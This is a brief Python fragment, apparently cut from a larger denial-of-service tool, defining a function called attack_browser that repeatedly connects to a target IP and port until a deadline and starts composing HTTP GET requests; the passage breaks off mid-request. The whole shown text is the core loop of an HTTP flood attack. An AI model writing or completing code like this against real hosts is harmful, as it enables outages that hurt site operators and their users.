def attack_browser(ip, port, secs, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s.connect((ip, port))
            request = (f'GET / HTTP/1.1\r\n'
